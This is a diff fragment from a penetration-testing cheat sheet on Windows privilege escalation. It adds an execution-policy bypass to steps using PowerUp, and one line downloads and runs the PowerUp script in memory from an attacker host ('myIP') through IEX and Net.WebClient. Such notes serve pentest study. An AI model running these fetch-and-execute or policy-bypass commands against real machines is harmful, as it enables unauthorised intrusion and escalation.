@@ -31,7 +31,7 @@
  # Privilege Escalation for Window
  0. `whoami` `systeminfo` `whoami /priv` Conduct basic enumeration, and look for interesting files in the directory 
  1. Transfer the file to Window to TMP directory using any of the above methods.
- 2. Use PowerUp.
+ 2. Use PowerUp. `powershell -ep bypass`
  3. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
  4. `Invoke-AllChecks`
  5. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
